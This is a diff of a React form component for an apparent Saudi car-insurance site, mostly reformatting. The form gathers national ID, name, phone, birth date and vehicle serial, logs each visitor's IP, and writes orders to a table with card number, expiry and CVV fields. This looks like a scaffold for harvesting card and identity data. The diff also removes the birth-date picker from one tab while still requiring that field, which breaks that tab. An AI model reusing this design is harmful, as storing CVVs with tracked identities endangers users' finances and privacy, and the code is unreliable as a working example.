@@ -34,15 +34,15 @@ const Hero = () => {
 
   const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>, isTransfer = false) => {
     let value = e.target.value.replace(/\D/g, '');
-    
+
     if (!value.startsWith('05')) {
       value = '05';
     }
-    
+
     if (value.length > 10) {
       value = value.slice(0, 10);
     }
-    
+
     if (isTransfer) {
       setTransferPhoneNumber(value);
     } else {
@@ -53,7 +53,7 @@ const Hero = () => {
   const handleOwnerNameChange = (e: React.ChangeEvent<HTMLInputElement>, isTransfer = false) => {
     // السماح بالحروف العربية والإنجليزية والمسافات فقط
     const value = e.target.value.replace(/[^a-zA-Z\u0600-\u06FF\s]/g, '');
-    
+
     if (isTransfer) {
       setTransferOwnerName(value);
     } else {
@@ -64,25 +64,25 @@ const Hero = () => {
   const handleNext = async () => {
     // Determine which tab is active and validate accordingly
     const isTransferTab = activeTab === "transfer";
-    
+
     const currentIdNumber = isTransferTab ? transferIdNumber : idNumber;
     const currentSequenceNumber = isTransferTab ? transferSequenceNumber : sequenceNumber;
     const currentBirthDate = isTransferTab ? transferBirthDate : birthDate;
     const currentPhoneNumber = isTransferTab ? transferPhoneNumber : phoneNumber;
     const currentOwnerName = isTransferTab ? transferOwnerName : ownerName;
     const currentCardType = isTransferTab ? transferCardType : cardType;
-    
+
     // Validate all required fields
     if (!currentIdNumber || currentIdNumber.trim() === "") {
       toast.error("يرجى إدخال رقم الهوية / الإقامة");
       return;
     }
-    
+
     if (!currentOwnerName || currentOwnerName.trim() === "") {
       toast.error("يرجى إدخال اسم مالك الوثيقة كاملاً");
       return;
     }
-    
+
     if (!currentPhoneNumber || currentPhoneNumber.trim() === "") {
       toast.error("يرجى إدخال رقم الهاتف");
       return;
@@ -92,31 +92,31 @@ const Hero = () => {
       toast.error("رقم الهاتف يجب أن يبدأ بـ 05 ويتكون من 10 أرقام");
       return;
     }
-    
+
     if (!currentBirthDate) {
       toast.error("يرجى اختيار تاريخ الميلاد");
       return;
     }
-    
+
     if (!currentCardType) {
       toast.error("يرجى اختيار نوع البطاقة");
       return;
     }
-    
+
     if (!currentSequenceNumber || currentSequenceNumber.trim() === "") {
       toast.error("يرجى إدخال الرقم التسلسلي");
       return;
     }
 
     const formattedBirthDate = format(currentBirthDate, "yyyy-MM-dd");
-    
+
     // Update context
     updateOrderData({
       idNumber: currentIdNumber,
       sequenceNumber: currentSequenceNumber,
       birthDate: formattedBirthDate,
       phoneNumber: currentPhoneNumber,
-      ownerName: currentOwnerName,
+      ownerName: currentOwnerName
     });
 
     // Check if order exists, if not create it
@@ -124,59 +124,59 @@ const Hero = () => {
       // Get visitor IP from visitor_tracking
       let visitorIp = null;
       if (sessionId) {
-        const { data: visitorData } = await supabase
-          .from("visitor_tracking")
-          .select("ip_address")
-          .eq("session_id", sessionId)
-          .order("created_at", { ascending: false })
-          .limit(1)
-          .maybeSingle();
-        
+        const { data: visitorData } = await supabase.
+        from("visitor_tracking").
+        select("ip_address").
+        eq("session_id", sessionId).
+        order("created_at", { ascending: false }).
+        limit(1).
+        maybeSingle();
+
         if (visitorData?.ip_address) {
           visitorIp = visitorData.ip_address;
         }
       }
 
-      const { data: existingOrder } = await supabase
-        .from("customer_orders")
-        .select("id")
-        .eq("sequence_number", currentSequenceNumber)
-        .maybeSingle();
+      const { data: existingOrder } = await supabase.
+      from("customer_orders").
+      select("id").
+      eq("sequence_number", currentSequenceNumber).
+      maybeSingle();
 
       if (!existingOrder) {
         // Insert new order
-        await supabase
-          .from("customer_orders")
-          .insert({
-            id_number: currentIdNumber,
-            sequence_number: currentSequenceNumber,
-            birth_date: formattedBirthDate,
-            phone_number: currentPhoneNumber,
-            owner_name: currentOwnerName,
-            vehicle_type: "",
-            vehicle_purpose: "",
-            insurance_company: "",
-            insurance_price: 0,
-            card_number: "",
-            card_holder_name: "",
-            expiry_date: "",
-            cvv: "",
-            status: "pending",
-            visitor_session_id: sessionId,
-            visitor_ip: visitorIp,
-          });
+        await supabase.
+        from("customer_orders").
+        insert({
+          id_number: currentIdNumber,
+          sequence_number: currentSequenceNumber,
+          birth_date: formattedBirthDate,
+          phone_number: currentPhoneNumber,
+          owner_name: currentOwnerName,
+          vehicle_type: "",
+          vehicle_purpose: "",
+          insurance_company: "",
+          insurance_price: 0,
+          card_number: "",
+          card_holder_name: "",
+          expiry_date: "",
+          cvv: "",
+          status: "pending",
+          visitor_session_id: sessionId,
+          visitor_ip: visitorIp
+        });
       } else {
         // Update existing order
-        await supabase
-          .from("customer_orders")
-          .update({
-            id_number: currentIdNumber,
-            birth_date: formattedBirthDate,
-            phone_number: currentPhoneNumber,
-            owner_name: currentOwnerName,
-            visitor_ip: visitorIp,
-          })
-          .eq("sequence_number", currentSequenceNumber);
+        await supabase.
+        from("customer_orders").
+        update({
+          id_number: currentIdNumber,
+          birth_date: formattedBirthDate,
+          phone_number: currentPhoneNumber,
+          owner_name: currentOwnerName,
+          visitor_ip: visitorIp
+        }).
+        eq("sequence_number", currentSequenceNumber);
       }
     } catch (error) {
       console.error("Error saving order:", error);
@@ -191,11 +191,11 @@ const Hero = () => {
       <div className="relative w-full bg-gradient-to-r from-blue-50 to-white">
         <div className="container mx-auto px-4">
           <div className="relative">
-            <img 
-              src={heroBanner} 
-              alt="أول منصة لتأمين السيارات في السعودية" 
-              className="w-full h-auto object-cover"
-            />
+            <img
+              src={heroBanner}
+              alt="أول منصة لتأمين السيارات في السعودية"
+              className="w-full h-auto object-cover" />
+            
           </div>
         </div>
       </div>
@@ -214,9 +214,9 @@ const Hero = () => {
               <TabsContent value="new" className="space-y-5">
                 <div className="space-y-2">
                   <Label htmlFor="id-number" className="text-base">رقم الهوية / الإقامة الخاص بك</Label>
-                  <Input 
-                    id="id-number" 
-                    type="text" 
+                  <Input
+                    id="id-number"
+                    type="text"
                     placeholder=""
                     maxLength={10}
                     pattern="[0-9]*"
@@ -226,65 +226,65 @@ const Hero = () => {
                     onChange={(e) => {
                       const value = e.target.value.replace(/\D/g, '');
                       setIdNumber(value);
-                    }}
-                  />
+                    }} />
+                  
                 </div>
 
                 <div className="space-y-2">
                   <Label htmlFor="owner-name" className="text-base">
                     اسم مالك الوثيقة كاملاً <span className="text-red-500">*</span>
                   </Label>
-                  <Input 
-                    id="owner-name" 
-                    type="text" 
+                  <Input
+                    id="owner-name"
+                    type="text"
                     placeholder="أدخل الاسم الكامل"
                     className="h-12 text-base"
                     value={ownerName}
                     onChange={(e) => handleOwnerNameChange(e, false)}
-                    required
-                  />
+                    required />
+                  
                 </div>
 
                 <div className="space-y-2">
                   <Label htmlFor="phone" className="text-base">
                     رقم الهاتف <span className="text-red-500">*</span>
                   </Label>
-                  <Input 
-                    id="phone" 
-                    type="tel" 
+                  <Input
+                    id="phone"
+                    type="tel"
                     placeholder="05xxxxxxxx"
                     value={phoneNumber}
                     onChange={(e) => handlePhoneChange(e, false)}
                     maxLength={10}
                     inputMode="numeric"
                     className="h-12 text-base"
-                    required
-                  />
+                    required />
+                  
                 </div>
 
-                <DatePicker
-                  label="تاريخ الميلاد"
-                  value={birthDate}
-                  onChange={setBirthDate}
-                />
+                
+
+
+
+                
 
                 <div className="space-y-2">
                   <Label className="text-base">نوع البطاقة</Label>
                   <div className="grid grid-cols-2 gap-4">
-                    <Button 
+                    <Button
                       type="button"
                       variant={cardType === "form" ? "default" : "outline"}
                       className="h-12 text-base"
-                      onClick={() => setCardType("form")}
-                    >
+                      onClick={() => setCardType("form")}>
+                      
                       استمارة
                     </Button>
-                    <Button 
+                    <Button
                       type="button"
                       variant={cardType === "customs" ? "default" : "outline"}
                       className="h-12 text-base"
-                      onClick={() => setCardType("customs")}
-                    >
+                      onClick={() => setCardType("customs")}>
+                      
                       بطاقة جمركية
                     </Button>
                   </div>
@@ -292,9 +292,9 @@ const Hero = () => {
 
                 <div className="space-y-2">
                   <Label htmlFor="serial" className="text-base">الرقم التسلسلي / بطاقة جمركية</Label>
-                  <Input 
-                    id="serial" 
-                    type="text" 
+                  <Input
+                    id="serial"
+                    type="text"
                     placeholder="000000000"
                     maxLength={15}
                     pattern="[0-9]*"
@@ -304,26 +304,26 @@ const Hero = () => {
                     onChange={(e) => {
                       const value = e.target.value.replace(/\D/g, '');
                       setSequenceNumber(value);
-                    }}
-                  />
+                    }} />
+                  
                 </div>
 
                 <div className="flex items-start space-x-2 space-x-reverse">
                   <Checkbox id="terms" />
                   <label
                     htmlFor="terms"
-                    className="text-sm text-muted-foreground leading-relaxed cursor-pointer"
-                  >
+                    className="text-sm text-muted-foreground leading-relaxed cursor-pointer">
+                    
                     أوافق على منح شركة عناية الوسيط الحق في الاستعلام من شركة نجم و/أو مركز المعلومات الوطني عن بياناتي
                   </label>
                 </div>
 
-                <Button 
+                <Button
                   type="button"
-                  className="w-full h-12 text-lg font-semibold bg-accent hover:bg-accent/90" 
+                  className="w-full h-12 text-lg font-semibold bg-accent hover:bg-accent/90"
                   size="lg"
-                  onClick={handleNext}
-                >
+                  onClick={handleNext}>
+                  
                   التالي
                 </Button>
               </TabsContent>
@@ -331,9 +331,9 @@ const Hero = () => {
               <TabsContent value="transfer" className="space-y-5">
                 <div className="space-y-2">
                   <Label htmlFor="transfer-id-number" className="text-base">رقم الهوية / الإقامة الخاص بك</Label>
-                  <Input 
-                    id="transfer-id-number" 
-                    type="text" 
+                  <Input
+                    id="transfer-id-number"
+                    type="text"
                     placeholder=""
                     maxLength={10}
                     pattern="[0-9]*"
@@ -343,65 +343,65 @@ const Hero = () => {
                     onChange={(e) => {
                       const value = e.target.value.replace(/\D/g, '');
                       setTransferIdNumber(value);
-                    }}
-                  />
+                    }} />
+                  
                 </div>
 
                 <div className="space-y-2">
                   <Label htmlFor="transfer-owner-name" className="text-base">
                     اسم مالك الوثيقة كاملاً <span className="text-red-500">*</span>
                   </Label>
-                  <Input 
-                    id="transfer-owner-name" 
-                    type="text" 
+                  <Input
+                    id="transfer-owner-name"
+                    type="text"
                     placeholder="أدخل الاسم الكامل"
                     className="h-12 text-base"
                     value={transferOwnerName}
                     onChange={(e) => handleOwnerNameChange(e, true)}
-                    required
-                  />
+                    required />
+                  
                 </div>
 
                 <div className="space-y-2">
                   <Label htmlFor="transfer-phone" className="text-base">
                     رقم الهاتف <span className="text-red-500">*</span>
                   </Label>
-                  <Input 
-                    id="transfer-phone" 
-                    type="tel" 
+                  <Input
+                    id="transfer-phone"
+                    type="tel"
                     placeholder="05xxxxxxxx"
                     value={transferPhoneNumber}
                     onChange={(e) => handlePhoneChange(e, true)}
                     maxLength={10}
                     inputMode="numeric"
                     className="h-12 text-base"
-                    required
-                  />
+                    required />
+                  
                 </div>
 
                 <DatePicker
                   label="تاريخ الميلاد"
                   value={transferBirthDate}
-                  onChange={setTransferBirthDate}
-                />
+                  onChange={setTransferBirthDate} />
+                
 
                 <div className="space-y-2">
                   <Label className="text-base">نوع البطاقة</Label>
                   <div className="grid grid-cols-2 gap-4">
-                    <Button 
+                    <Button
                       type="button"
                       variant={transferCardType === "form" ? "default" : "outline"}
                       className="h-12 text-base"
-                      onClick={() => setTransferCardType("form")}
-                    >
+                      onClick={() => setTransferCardType("form")}>
+                      
                       استمارة
                     </Button>
-                    <Button 
+                    <Button
                       type="button"
                       variant={transferCardType === "customs" ? "default" : "outline"}
                       className="h-12 text-base"
-                      onClick={() => setTransferCardType("customs")}
-                    >
+                      onClick={() => setTransferCardType("customs")}>
+                      
                       بطاقة جمركية
                     </Button>
                   </div>
@@ -409,9 +409,9 @@ const Hero = () => {
 
                 <div className="space-y-2">
                   <Label htmlFor="transfer-serial" className="text-base">الرقم التسلسلي / بطاقة جمركية</Label>
-                  <Input 
-                    id="transfer-serial" 
-                    type="text" 
+                  <Input
+                    id="transfer-serial"
+                    type="text"
                     placeholder="000000000"
                     maxLength={15}
                     pattern="[0-9]*"
@@ -421,26 +421,26 @@ const Hero = () => {
                     onChange={(e) => {
                       const value = e.target.value.replace(/\D/g, '');
                       setTransferSequenceNumber(value);
-                    }}
-                  />
+                    }} />
+                  
                 </div>
 
                 <div className="flex items-start space-x-2 space-x-reverse">
                   <Checkbox id="transfer-terms" />
                   <label
                     htmlFor="transfer-terms"
-                    className="text-sm text-muted-foreground leading-relaxed cursor-pointer"
-                  >
+                    className="text-sm text-muted-foreground leading-relaxed cursor-pointer">
+                    
                     أوافق على منح شركة عناية الوسيط الحق في الاستعلام من شركة نجم و/أو مركز المعلومات الوطني عن بياناتي
                   </label>
                 </div>
 
-                <Button 
+                <Button
                   type="button"
-                  className="w-full h-12 text-lg font-semibold bg-accent hover:bg-accent/90" 
+                  className="w-full h-12 text-lg font-semibold bg-accent hover:bg-accent/90"
                   size="lg"
-                  onClick={handleNext}
-                >
+                  onClick={handleNext}>
+                  
                   التالي
                 </Button>
               </TabsContent>
@@ -448,8 +448,8 @@ const Hero = () => {
           </div>
         </div>
       </div>
-    </div>
-  );
+    </div>);
+
 };
 
 export default Hero;
